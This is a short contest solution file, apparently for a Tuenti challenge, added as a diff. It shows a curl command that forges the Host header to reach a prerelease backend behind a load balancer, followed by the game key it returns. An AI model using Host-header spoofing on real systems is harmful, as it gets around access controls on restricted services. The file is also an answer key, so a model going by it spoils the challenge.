@@ -1,0 +1,13 @@
+# Solution
+
+We need to forge the domain we are trying to access, pretending we are in the prerelease for the load balancer:
+
+```
+$ curl --header "Host: pre.steam-origin.contest.tuenti.net" steam-origin.contest.tuenti.net:9876/games/cat_fight/get_key
+```
+
+The command returns:
+
+```
+{"game":"Cat Fight","key":"7544-5747-5357"}
+```
